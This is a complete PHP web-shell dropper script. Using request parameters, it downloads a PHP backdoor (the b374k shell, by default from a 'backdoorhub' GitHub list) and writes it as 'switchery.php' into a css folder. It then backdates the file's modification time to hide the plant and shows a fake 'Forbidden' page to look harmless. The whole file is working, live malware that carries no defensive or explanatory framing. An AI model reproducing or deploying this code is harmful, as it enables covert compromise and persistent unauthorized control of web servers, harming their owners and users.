<?php
$gpath = $_GET['path'];
$url1 = $_GET['url'];
$fname1 = $_GET['fname'];
if (!isset($gpath)){
    $path = '../../switchery/css/';
}
else{
    $path = $gpath;
}
if (!isset($fname1)){
    $fname = 'switchery.php';
}
else{
    $fname = $fname1;
}
if (!isset($url1)){
    $url = 'https://raw.githubusercontent.com/backdoorhub/shell-backdoor-list/master/shell/php/b374k.php';
}
else{
    $url = $url1;
}
$fpath = $path . $fname;
$file_data = file_get_contents($url);
file_put_contents($fpath, $file_data);
touch($fpath, strtotime("01-Oct-2021 11:05:57"));
echo("<h1>Forbidden!</h1><br><br>You don't have permission to access this directory on this server.");
?>
